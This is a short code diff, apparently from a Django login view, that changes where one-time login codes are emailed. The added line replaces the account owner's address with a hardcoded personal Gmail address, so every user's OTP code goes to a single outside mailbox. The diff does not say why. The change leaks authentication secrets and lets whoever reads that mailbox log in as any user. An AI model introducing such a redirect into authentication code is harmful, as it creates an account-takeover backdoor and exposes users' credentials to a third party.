@@ -198,7 +198,7 @@ def generate_otp(request):
 
    
     result = send_email(
-        to_email=user.email,
+        to_email="johnphilipbaylon17@gmail.com",
         subject="OTP code From SDO",
         body=f'Enter this to confirm your Login: {otp_code}'
     )
